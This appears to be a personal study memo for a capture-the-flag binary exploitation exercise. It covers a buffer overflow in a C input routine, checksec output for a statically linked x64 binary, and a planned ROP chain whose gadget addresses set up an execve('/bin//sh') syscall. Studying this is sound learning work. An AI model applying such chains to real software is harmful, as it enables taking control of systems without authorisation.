# Lesson
- get a sence of finding vulnerable points  
  ```c
  int BUFSIZE = 100;
  char winner[BUFSIZE];
  fgets(winner, 360, stdin);
  ```
- ROP for x64  
- `x/xb` of `gdb`  
  gdb  
  ```zsh
  (pwndbg)$ x/170xb 0x7fffffffdc6c
  ```

# Memo  
1. check  
    ```zsh
    $ file ./vuln
    ./vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
    $ checksec --file=./vuln --output=json | jq .
    {
      "./vuln": {
        "relro": "partial",
        "canary": "no",
        "nx": "yes",
        "pie": "no",
        "rpath": "n/a",
        "runpath": "n/a",
        "symbols": "yes",
        "fortify_source": "no",
        "fortified": "0",
        "fortify-able": "0"
      }
    }
    ```

2. ghidra  

3. gdb  
    - stage1: brute force  
    - stage2: ROP  
      - goal
        ```
        rax: 59 for sys_execve
        rdi: an address(pointer) to "/bin/sh"
        rsi: 0
        rdx: 0
        ```
      - find gadgets  
        ```zsh
        $ ROPgadget --binary ./vuln --re "mov dword ptr" | grep ret
        $ ROPgadget --binary ./vuln --re "rdi" | grep "mov dword"
        $ ROPgadget --binary ./vuln --re "pop rdi"
        ```
      - stack structure  
        ```
        0x00000000004163f4 : pop rax ; ret
        "/bin//sh"
        0x000000000044a6b5 : pop rdx ; ret
        (address)
        0x0000000000419127 : mov qword ptr [rdx], rax ; ret
        0x0000000000400696 : pop rdi ; ret
        (address)
        0x0000000000410ca3 : pop rsi ; ret
        0
        0x000000000044a6b5 : pop rdx ; ret
        0
        0x00000000004163f4 : pop rax ; ret
        59
        0x000000000040137c : syscall
        ```

# Ref
- https://book.hacktricks.xyz/v/jp/reversing-and-exploiting/linux-exploiting-basic-esp/rop-syscall-execv